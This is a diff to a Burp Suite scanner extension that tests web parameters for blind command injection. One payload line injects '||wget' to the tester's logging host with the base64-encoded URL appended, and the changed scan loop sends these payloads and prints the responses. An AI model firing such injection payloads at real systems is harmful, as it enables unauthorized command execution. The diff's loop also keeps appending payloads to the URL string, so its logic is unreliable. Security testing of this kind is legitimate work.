@@ -90,11 +90,18 @@ class MyCommandExec(IScannerCheck):
                             '||wget ' + self._log_host + '/?u=$u'\
                             ]
     def doActiveScan(self, basePair, insertionPoint):
-        u = self._helpers.analyzeRequest(basePair).getUrl()
-        base64_u = base64.urlsafe_b64encode(u)
+        url = self._helpers.analyzeRequest(basePair).getUrl()
+        u = url.getProtocol() + "://" + url.getAuthority() + url.getPath()
+        print 'u:',u
+        #base64_u = base64.encodestring(u)
+        #base64_u = self._helpers.base64Encode(u)
+        #print 'base64_u', base64_u
         for payload in self._payloads:
-            payload = Template(payload).substitute(u=base64_u) 
-            attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
+            print 'payload', payload
+            u = u + "  " +  payload
+            base64_u = self._helpers.base64Encode(u)
+            substituted_payload = payload.replace('$u', base64_u)
+            attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(substituted_payload))
             print self._helpers.bytesToString(attack.getResponse())
         
         return None
